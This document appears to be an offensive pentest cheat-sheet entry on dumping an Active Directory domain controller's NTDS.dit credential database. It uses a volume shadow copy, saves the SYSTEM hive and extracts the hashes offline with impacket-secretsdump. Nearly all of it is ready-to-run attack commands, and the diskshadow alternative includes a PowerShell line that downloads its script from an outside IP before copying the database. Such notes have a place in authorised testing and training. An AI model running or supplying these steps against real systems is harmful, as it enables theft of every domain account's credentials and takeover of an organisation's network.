---
title: NTDS.dit Extraction via Shadow Copy
category: ad
subcategory: ad-attacks
os: windows, linux
command: impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
tools: vshadow, robocopy, reg, impacket-secretsdump, diskshadow
---


### Step 1 - Create a Shadow Copy on the DC (Domain Admin)

```cmd
vshadow.exe -nw -p C:
```

Note the snapshot device name, e.g. `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5`.

### Step 2 - Copy NTDS.dit

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\ntds\ntds.dit c:\ntds.dit.bak
```

### Step 3 - Save SYSTEM hive

```cmd
reg.exe save hklm\system c:\system.bak
```

### Step 4 - Offline extract on Kali

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

### Alternative - diskshadow script

`viper.dsh`:

```
set context persistent nowriters
add volume c: alias viper
create
expose %viper% x:
```

Run on the DC:

```cmd
unix2dos viper.dsh
powershell -c iwr -uri http://10.13.31.108/viper.dsh -o viper.dsh
diskshadow /s viper.dsh
robocopy /b x:\windows\ntds . ntds.dit
reg save hklm\system c:\windows\temp\system
```
